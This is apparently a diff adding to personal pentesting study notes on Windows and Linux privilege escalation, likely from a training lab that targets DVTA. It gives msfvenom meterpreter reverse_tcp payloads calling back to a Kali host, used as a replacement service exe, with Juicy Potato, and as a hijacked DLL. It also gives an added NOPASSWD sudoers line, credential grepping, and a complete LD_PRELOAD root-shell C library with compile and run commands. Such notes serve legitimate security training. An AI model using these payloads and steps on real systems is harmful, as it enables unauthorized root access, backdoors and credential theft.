@@ -63,4 +63,91 @@ Attack vector:
 
 **Steps**:
 - Use `msfvenom -p windows/meterpreter/reverse_tcp .... -f exe > "FileZilla Server.exe"` to generate payload
-- Setup the `multi/handler`
+- Setup the `multi/handler` -> set InitialAutoRunScript `post/windows/manage/migrate` 
+- Replace the payload with actual exe
+- Restart the service   
+
+### Juicy Potato
+
+Juicy Potato is a Windows privilege escalation exploit that leverages specific vulnerabilities related to DCOM (Distributed Component Object Model) and the way Windows manages the communication between processes and services. 
+
+**StepS:**
+- After gain initial access, we can upload the backdoor.exe (msfvenom, reverse_tcp to Kali) and `Juicy_Potato.exe`
+  - [Github repo](https://github.com/ohpe/juicy-potato)
+- Setup multi/handler for the payload above
+- Back to first meterpreter -> shell -> `JuicyPotato.exe -l 5555 -p <path_to_backdoor> -t * -c <cls_id>`
+
+`Cls_id` Input is the COM that we targeted
+- [Definition](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
+- [How to found correct id](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
+
+### DLL Hijacking
+
+DLL Hijacking is a privilege escalation technique where an attacker manipulates the way windows application load DLL to execute malicious code with elevated privilege
+
+Understand Default Search Order: Windows has a predefined order for searching for DLLs. It generally starts with the application's directory, followed by the system directories, and then other system-defined paths.
+
+Common locations include:
+- The application's current working directory.
+- The System32 or SysWOW64 directories.
+- Directories listed in the PATH environment variable.
+- Other directories included in the search order.
+
+You need to be able to make change one of these folder
+
+- Inject the malicous dll, then the programs will load the malicious dll
+
+Tools:
+- DVTA (Our target)
+- Promon
+
+**Steps:**
+- Procmon filter `CreateFile` -> Run DVTA
+- Procmon filter ProcessName is `DVTA.exe`
+- Filter result that `NAME NOT FOUND`, searching for dll that process not found and the folder that we can access
+- Check the ACL with `Get-ACL '/path/to/folder/' | Format-list
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST ... -f dll > payload.dll`
+- Ship the payload and setup multi/handler -> Place the dll to correct folder
+
+## Linux
+
+### Local store
+
+Looking for folder maybe contain config
+
+- `grep -nr "password"` Grep content
+
+### SUID
+
+`find / -perm -u=s -type f 2>/dev/null` - Looking for binary that have root privilege
+
+We can looking for change the content of `/etc/sudoer` file.
+- Add this line `<user> ALL=(ALL) NOPASSWD:ALL`
+
+### Share library inject
+
+Several techniques can be used to inject a shared library into a running process:
+- Using LD_PRELOAD: This environment variable specifies a shared library to be loaded before any other libraries. By setting this variable, an attacker can preload a malicious shared library into a process.
+- Process Control (ptrace): The ptrace system call allows a process to control another process, typically used for debugging. Attackers can use ptrace to inject code into a running process, causing it to load a malicious shared library
+
+Steps:
+- Check with `sudo -l`
+  - Looking for LD_PRELOAD privilege
+- Create a malicious dll
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/sh");
+}
+```
+
+Compile `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+
+Run `sudo LD_PRELOAD=/home/student/shell.so apache2`
